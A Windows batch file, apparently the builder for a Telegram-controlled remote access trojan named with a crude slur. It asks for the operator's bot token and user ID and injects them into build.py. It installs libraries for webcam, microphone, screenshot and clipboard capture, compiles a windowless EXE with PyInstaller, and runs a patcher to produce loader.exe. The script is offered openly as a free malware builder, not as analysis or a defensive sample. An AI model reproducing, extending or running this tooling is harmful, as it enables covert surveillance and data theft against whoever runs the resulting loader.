@echo off
setlocal enabledelayedexpansion
title PIDORATKA - Free builder
color F0

echo.
echo  #########################################################
echo  #                                                       #
echo  #             PIDORATKA - Free BUILDER                  #
echo  #                                                       #
echo  #########################################################
echo.

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python to continue.
    pause
    exit /b 1
)


set "BOT_TOKEN="
set "OPERATOR_ID="

echo [+] Enter your Telegram Bot Token:
set /p BOT_TOKEN=
echo [+] Enter your Telegram User ID (Operator ID):
set /p OPERATOR_ID=

if "%BOT_TOKEN%"=="" (
    echo [!] Bot Token cannot be empty.
    pause
    exit /b 1
)
if "%OPERATOR_ID%"=="" (
    echo [!] Operator ID cannot be empty.
    pause
    exit /b 1
)

echo.
echo [+] Updating build.py with your credentials...

(
echo import re
echo import os
echo with open('build.py', 'r', encoding='utf-8'^) as f: content = f.read(^)
echo content = re.sub(r'BOT_TOKEN = ".*?"', f'BOT_TOKEN = "{os.environ["BOT_TOKEN"]}"', content^)
echo content = re.sub(r'OPERATOR_ID = \d+', f'OPERATOR_ID = {os.environ["OPERATOR_ID"]}', content^)
echo with open('build.py', 'w', encoding='utf-8'^) as f: f.write(content^)
) > update_config.py


set "BOT_TOKEN=%BOT_TOKEN%"
set "OPERATOR_ID=%OPERATOR_ID%"
python update_config.py
del update_config.py

echo [+] Installing required dependencies (this may take a minute)...
python -m pip install --upgrade pip >nul 2>&1
pip install pytelegrambotapi psutil opencv-python sounddevice soundfile pillow pyautogui pyperclip requests pywin32 fastapi uvicorn pyinstaller >nul 2>&1

echo [+] Building EXE...
pyinstaller --onefile --windowed --noconsole --icon=NONE --name build.exe build.py

if not exist "dist\build.exe" (
    echo.
    echo [!] Build failed. PyInstaller could not create the EXE.
    echo [!] Make sure you have all dependencies installed correctly.
    pause
    exit /b 1
)

echo [+] Applying Patcher...
if exist "dist\patcher.py" (
    python dist\patcher.py dist\build.exe
) else (
    echo [!] Patcher script not found in dist folder!
    pause
    exit /b 1
)

if exist "dist\loader.exe" (
    echo.
    echo  #########################################################
    echo  #                                                       #
    echo  #            SUCCESSSSSSSSSSSSSSSSSSSSSSSS              #
    echo  #                                                       #
    echo  #########################################################
    echo
    echo
    echo
    echo ne ebite mozgi bolshe
    echo.
) else (
    echo [!] Patching failed. Loader.exe not found.
    echo [!] Check if dist\patcher.py is working correctly.
)

pause
exit /b 0
